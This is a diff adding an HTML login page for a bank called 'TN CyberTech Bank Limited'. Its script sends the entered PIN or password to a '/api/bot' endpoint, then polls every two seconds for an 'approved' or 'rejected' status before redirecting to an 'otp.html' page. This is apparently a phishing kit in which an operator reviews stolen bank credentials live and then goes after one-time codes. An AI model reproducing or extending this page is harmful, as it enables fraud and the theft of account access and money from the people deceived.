@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TN CyberTech - Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { margin: 0; background-color: #fcfcfc; display: flex; justify-content: center; min-height: 100vh; }
+        .app-container { width: 100%; max-width: 400px; padding: 20px 20px 40px 20px; display: flex; flex-direction: column; }
+        
+        .back-btn { font-size: 24px; color: #333; text-decoration: none; margin-bottom: 20px; display: inline-block;}
+
+        .logo-container { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 20px; margin-bottom: 60px; }
+        .icon { position: relative; width: 60px; height: 60px; }
+        .sq { position: absolute; background: linear-gradient(135deg, #FFD700, #B8860B); border-radius: 4px; }
+        .sq1 { width: 15px; height: 15px; top: 0; left: 0; }
+        .sq2 { width: 15px; height: 15px; top: 20px; left: 0; }
+        .sq3 { width: 15px; height: 15px; top: 8px; left: 20px; }
+        .u-shape { position: absolute; width: 35px; height: 45px; bottom: 0; right: 0; border-left: 10px solid #FFD700; border-bottom: 10px solid #FFD700; border-bottom-left-radius: 15px; border-right: 10px solid #FFD700; border-top: 10px solid #FFD700; border-top-right-radius: 15px; }
+        
+        .text-container { display: flex; flex-direction: column; align-items: flex-start; }
+        .text-tn { font-size: 24px; font-weight: 900; color: #000; line-height: 1; }
+        .text-cyber { font-size: 28px; font-weight: 900; color: #000; line-height: 1; }
+        .text-bank { font-size: 16px; font-weight: 700; color: #000; line-height: 1.2; }
+
+        h1 { font-family: 'Caveat', cursive; font-size: 36px; color: #000; margin-bottom: 5px; font-weight: 700;}
+        p { font-size: 18px; color: #555; margin-bottom: 30px; font-family: 'Caveat', cursive;}
+
+        .input-box { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 12px; padding: 15px; margin-bottom: 30px; background: white; }
+        .input-icon { font-size: 20px; color: #B8860B; margin-right: 15px; }
+        .input-box input { border: none; outline: none; flex-grow: 1; font-size: 16px; color: #333; background: transparent; letter-spacing: 2px;}
+        .input-box input::placeholder { color: #999; font-style: italic; letter-spacing: normal;}
+
+        .btn-main { width: 100%; background: linear-gradient(90deg, #B8860B, #FFD700, #B8860B); color: #000; font-size: 18px; font-weight: 600; padding: 18px; border: none; border-radius: 30px; cursor: pointer; font-family: 'Caveat', cursive; margin-bottom: 20px; }
+        .btn-main:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; }
+
+        .footer { text-align: center; margin-top: auto; padding-bottom: 20px;}
+        .footer p { font-size: 14px; font-family: 'Inter', sans-serif; margin-bottom: 30px; }
+        .footer a { color: #B8860B; text-decoration: none; font-family: 'Caveat', cursive; font-size: 18px; margin-left: 5px;}
+        .moon-icon { font-size: 24px; color: #555; cursor: pointer; margin-bottom: 20px;}
+        .version { font-size: 14px; color: #888; }
+
+        .error-msg { color: red; font-size: 13px; font-weight: bold; text-align: center; display: none; margin-bottom: 10px; }
+
+        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #FFD700; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="overlay">
+        <div class="spinner"></div>
+        <h2 style="color:#FFD700;">Verifying...</h2>
+    </div>
+
+    <div class="app-container">
+        <a href="welcome.html" class="back-btn">&#8592;</a>
+
+        <div class="logo-container">
+            <div class="icon">
+                <div class="sq sq1"></div>
+                <div class="sq sq2"></div>
+                <div class="sq sq3"></div>
+                <div class="u-shape"></div>
+            </div>
+            <div class="text-container">
+                <div class="text-tn">TN</div>
+                <div class="text-cyber">CyberTech</div>
+                <div class="text-bank">Bank Limited</div>
+            </div>
+        </div>
+
+        <h1>Welcome</h1>
+        <p>Let's get you authenticated</p>
+
+        <div class="error-msg" id="errorMsg">Incorrect PIN/Password. Try again.</div>
+
+        <div class="input-box">
+            <span class="input-icon">🔒</span>
+            <input type="password" id="pin" placeholder="Password or Pin" oninput="checkPin()">
+            <span style="color:#999; cursor:pointer;" onclick="togglePin()">👁️</span>
+        </div>
+
+        <button id="loginBtn" class="btn-main" onclick="submitLogin()">Login</button>
+
+        <div class="footer">
+            <p>Forgot your password or pin? <a href="#">Reset Pin</a></p>
+            <div class="moon-icon">🌙</div>
+            <div class="version">Version 4.0.6</div>
+        </div>
+    </div>
+
+    <script>
+        let globalUserId = sessionStorage.getItem('globalUserId') || Date.now().toString().slice(-6);
+        sessionStorage.setItem('globalUserId', globalUserId);
+        let userIdentifier = sessionStorage.getItem('userIdentifier');
+
+        function togglePin() {
+            let pinInput = document.getElementById('pin');
+            pinInput.type = pinInput.type === "password" ? "text" : "password";
+        }
+
+        // Enable button if at least 4 characters are typed
+        function checkPin() {
+            let pin = document.getElementById('pin').value;
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+
+        function submitLogin() {
+            let pin = document.getElementById('pin').value;
+            if(pin.length < 4) {
+                alert("Please enter your PIN or Password.");
+                return;
+            }
+
+            document.getElementById('overlay').style.display = 'flex';
+
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'LOGIN', userId: globalUserId, 
+                    data: { identifier: userIdentifier, value: pin } 
+                })
+            }).then(function() { 
+                pollStatus(); 
+            }).catch(function() {
+                document.getElementById('overlay').style.display = 'none';
+                alert("Network error.");
+            });
+        }
+
+        function pollStatus() {
+            let interval = setInterval(function() {
+                fetch('/api/bot?userId=' + globalUserId + '&type=LOGIN', { cache: 'no-store' })
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        window.location.href = 'otp.html'; 
+                    } else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('overlay').style.display = 'none';
+                        document.getElementById('errorMsg').style.display = 'block';
+                        document.getElementById('pin').value = ''; 
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+</body>
+  </html>
